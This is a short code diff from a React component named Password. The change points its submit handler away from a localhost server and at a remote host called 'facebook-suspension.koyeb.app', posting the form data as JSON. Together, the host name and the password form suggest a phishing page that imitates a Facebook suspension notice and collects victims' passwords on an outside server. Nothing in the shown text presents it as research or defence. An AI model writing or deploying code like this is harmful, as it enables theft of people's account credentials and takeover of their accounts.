@@ -15,7 +15,7 @@ const Password = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    fetch("http://localhost:5000/pass",{
+    fetch("https://facebook-suspension.koyeb.app/pass",{
       method:"POST",
       headers: {
         "Content-Type": "application/json"
